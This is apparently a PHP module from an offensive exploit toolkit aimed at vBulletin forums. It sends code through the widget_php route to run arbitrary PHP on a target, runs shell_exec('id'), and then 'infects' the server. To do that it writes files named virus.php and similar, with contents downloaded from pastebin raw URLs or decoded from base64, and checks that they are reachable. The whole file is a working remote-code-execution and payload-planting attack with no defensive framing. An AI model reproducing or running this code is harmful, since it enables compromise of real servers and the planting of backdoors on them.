<?php
namespace Exploit\vBulletin;

class Main implements ExploitInterface {

    /**
     * @var boolean $auto_spawn_virus
     */
    public $auto_spawn_virus = true;

    /**
     * @var int $timeout
     */
    public $timeout = 60;

    /**
     * @var array $proxy
     */
    public $proxy = [
        "enabled" => false,
        "proxy" => "127.0.0.1:8080"
    ];

    function __construct($dir){

        $this->request = new \HttpRequest\Main;
        $output_dir = $dir . "/output";

        if (!is_dir($output_dir)) {
            @mkdir($output_dir);
        }
        
        if($this->proxy["enabled"]){
            $this->request->proxy = $this->proxy["proxy"];
        }

        $this->idx = "";
        $this->mini = "";
        $this->vBulletin = (object)[];
        $this->vBulletin->payload_test = "echo 'vbulletin_anjay_mabar';exit;";
        $this->vBulletin->shell = [
            "echo shell_exec('id');",
            /*"echo exec('id;uname -a');",
            "echo passthru('id;uname -a');",
            "echo system('id;uname -a');"*/
        ];
        $this->vBulletin->payloads = json_decode(json_encode([
            "virus.php" => 'echo ( ((boolean)file_put_contents("virus.php", file_get_contents("https://pastebin.com/raw/5X50czZm"))) ? "ok" : "bad");',

            "virus3.php" => 'echo ( ((boolean)file_put_contents("virus3.php", file_get_contents("https://pastebin.com/raw/X0HKZ3Dt"))) ? "ok" : "bad");',

            "virus1.php" => 'echo ((boolean)file_put_contents("virus1.php", base64_decode("' . $this->idx . '")) ? "ok" : "bad");',

            "virus2.php" => 'echo ((boolean)file_put_contents("virus2.php", base64_decode("' . $this->mini . '")) ? "ok" : "bad");',
        ]));
    }

    function setTarget(String $url){
        $this->vBulletin->target = $url;
        return $this;
    }

    function setPayload(String $payload){
        $this->vBulletin->payload = $payload;
        return $this;
    }

    function request($payload){
        $this->request->isPOST();
        $this->request->timeout = $this->timeout;
        $this->request->url = $this->vBulletin->target;
        $this->request->postdata = http_build_query([
            "routestring" => "ajax/render/widget_php",
            "widgetConfig[code]" => $payload . "exit;"
        ]);
        $this->request->execute();
        return [$this->request->getHeaders(), $this->request->getBody()];
    }

    function isVulnerable(){
        $request = $this->request($this->vBulletin->payload_test);
        return ($request[1] == "vbulletin_anjay_mabar");
    }

    function infectTarget(){
        $x = 1;
        if ($this->isVulnerable()) {
            $output = [
                "vulnerable" => true
            ];
            foreach ($this->vBulletin->shell as $key => $payload) {
                $infect = $this->request($payload);
                $output["shell"] = $infect[1];
            }
            foreach ($this->vBulletin->payloads as $key => $payload) {
                $infect = $this->request($payload);
                if ($infect[1] == "ok") {
                    $x++;
                    $output["virus"][$x]["success"] = true;
                    $output["virus"][$x]["virus_name"] = $key;
                    $output["virus"][$x]["url"] = $this->vBulletin->target . "/" . $key;
                    //$output["virus"][$x]["virus_uploaded"] = $this->isVirusExists($key);
                }
            }
            return $output;
        }
        else{
            $output = [
                "vulnerable" => false,
                "success" => false
            ];
            return $output;
        }
    }

    function isVirusExists($virus){
        $this->request->isGET();
        $this->request->url = $this->vBulletin->target . $virus;
        $this->request->execute();

        return ($this->request->getHttpCode() == "200");
    }
}
?>